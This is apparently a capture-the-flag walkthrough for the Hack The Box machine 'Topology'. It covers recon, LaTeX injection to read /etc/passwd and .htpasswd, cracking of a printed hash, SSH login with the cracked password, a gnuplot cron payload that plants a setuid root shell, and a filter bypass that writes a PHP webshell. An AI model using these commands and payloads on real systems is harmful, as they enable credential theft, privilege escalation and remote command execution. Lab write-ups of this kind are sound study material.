## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)

## 🧭 Recon

### Nmap Scan
```bash
nmap -p- --min-rate 10000 10.10.11.217
nmap -p 22,80 -sCV 10.10.11.217
```

### Host Enumeration
```bash
# Add to /etc/hosts
echo "10.10.11.217 topology.htb latex.topology.htb dev.topology.htb stats.topology.htb" | sudo tee -a /etc/hosts
```

### Subdomain Bruteforce
```bash
ffuf -u http://10.10.11.217 -H "Host: FUZZ.topology.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
```

### Directory Bruteforce
```bash
feroxbuster -u http://10.10.11.217 -x html
```

---

## 🐚 Shell as `vdaisley`

### LaTeX File Read
```latex
$\lstinputlisting{/etc/passwd}$
```

### [Apache vhost + .htpasswd Enumeration](HTTP)
```latex
# View vhost config
$\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf}$

# View .htaccess
$\lstinputlisting{/var/www/dev/.htaccess}$

# View .htpasswd
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

### Hash Cracking
```bash
# Save hash
echo 'vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0' > vdaisley.hash

# Crack with hashcat
hashcat -m 1600 -a 0 vdaisley.hash /opt/rockyou.txt
```

### [SSH](SSH) Access
```bash
sshpass -p 'calculus20' ssh vdaisley@topology.htb
```

---

## ⚙️ Shell as root (via gnuplot cron)

### Gnuplot Cron Observation (with pspy)
```bash
wget http://10.10.14.6/pspy64
chmod +x pspy64
./pspy64
```

### Proof of Concept Payload
```bash
cat > /opt/gnuplot/0xdf.plt << EOF
set print "/dev/shm/0xdf-output"
output = system("id")
print(output)
EOF
```

### Create SetUID Root Shell
```bash
cat > /opt/gnuplot/0xdf.plt << EOF
system("cp /bin/bash /tmp/0xdf")
system("chmod 6777 /tmp/0xdf")
EOF

# Wait a minute, then:
/tmp/0xdf -p
```

---

## 📖 Beyond Root – LaTeX Filter Bypass

### Filter Bypass With `^^`
```latex
# Bypassing filter with \write
$\newwrite\outfile\openout\outfile=cmd.php\^^77rite\outfile{%3C?php system($_GET['cmd']); ?%3E}\closeout\outfile
```

### Trigger Webshell
```bash
curl "http://latex.topology.htb/tempfiles/cmd.php?cmd=id"
```

---

## 🛠️ Fix Broken Stats (Bonus)

### Patch `getdata.sh`
```bash
chattr -i /opt/gnuplot/getdata.sh

# Change grep 'enp' to 'eth' inside getdata.sh
sed -i 's/enp/eth/' /opt/gnuplot/getdata.sh
```

### Fix `networkplot.plt` Source Paths
```bash
# Replace '/var/www/gnuplot' with '/opt/gnuplot' in plot lines
sed -i 's|/var/www/gnuplot|/opt/gnuplot|g' /opt/gnuplot/networkplot.plt
```